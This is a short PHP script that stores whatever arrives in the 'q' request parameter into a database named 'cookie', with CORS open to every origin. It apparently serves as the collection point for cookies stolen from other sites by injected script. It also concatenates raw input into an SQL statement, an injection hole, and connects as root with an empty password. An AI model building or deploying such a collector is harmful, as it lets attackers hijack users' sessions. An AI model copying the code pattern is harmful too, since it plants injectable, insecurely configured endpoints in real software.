<?php
header('Access-Control-Allow-Origin: *');  
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "cookie";
$port = "3306";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname,$port);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = 'INSERT INTO tablecookie (data)
VALUES ("'.$_REQUEST["q"].'")';

if (mysqli_query($conn, $sql)) {
} else {
}
mysqli_close($conn);
?>